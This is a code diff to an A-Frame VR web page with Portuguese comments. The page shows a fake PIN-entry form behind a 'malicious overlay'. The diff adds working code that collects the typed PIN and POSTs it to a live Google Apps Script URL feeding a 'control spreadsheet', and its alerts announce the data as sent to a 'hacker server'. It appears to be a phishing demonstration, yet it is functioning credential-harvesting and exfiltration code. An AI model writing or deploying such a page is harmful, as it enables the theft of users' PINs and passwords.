@@ -57,29 +57,47 @@
       <a-entity camera></a-entity>
     </a-scene>
 
-    <script>
-      let senhaColetada = "";
+   <script>
+  let senhaColetada = "";
+  // COLE O LINK DA SUA IMPLANTAÇÃO DO GOOGLE APPS SCRIPT AQUI:
+  const URL_PLANILHA = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
 
-      function abrirPainel() {
-        document.querySelector('#fake-form').setAttribute('visible', 'true');
-        document.querySelector('#malicious-overlay').setAttribute('visible', 'false');
-        // Comando para garantir que os cliques funcionem no novo painel
-        document.querySelector('[cursor]').components.raycaster.refreshObjects();
-      }
+  function abrirPainel() {
+    document.querySelector('#fake-form').setAttribute('visible', 'true');
+    document.querySelector('#malicious-overlay').setAttribute('visible', 'false');
+    document.querySelector('[cursor]').components.raycaster.refreshObjects();
+  }
 
-      function registrarDigito(num) {
-        senhaColetada += num;
-        document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
-      }
+  function registrarDigito(num) {
+    senhaColetada += num;
+    document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
+  }
 
-      function finalizarAtaque() {
-        if(senhaColetada.length === 0) return;
-        alert("🚨 DADOS ROUBADOS!\n\nPIN: " + senhaColetada);
-        senhaColetada = "";
-        document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
-        document.querySelector('#fake-form').setAttribute('visible', 'false');
-        document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
-      }
-    </script>
+  function finalizarAtaque() {
+    if(senhaColetada.length === 0) return;
+
+    // Feedback de carregamento
+    document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');
+
+    // ENVIANDO PARA A PLANILHA VIA POST
+    fetch(URL_PLANILHA, {
+      method: 'POST',
+      mode: 'no-cors', // Necessário para o Google Apps Script
+      body: JSON.stringify({ senha: senhaColetada }),
+      headers: { 'Content-Type': 'application/json' }
+    }).then(() => {
+      alert("🚨 DADOS ENVIADOS AO SERVIDOR HACKER!\n\nVerifique a planilha de controle.");
+      
+      // Reseta a interface
+      senhaColetada = "";
+      document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
+      document.querySelector('#fake-form').setAttribute('visible', 'false');
+      document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
+    }).catch(err => {
+      console.error("Erro ao enviar:", err);
+      alert("Erro na conexão com o servidor hacker.");
+    });
+  }
+</script>
   </body>
 </html>
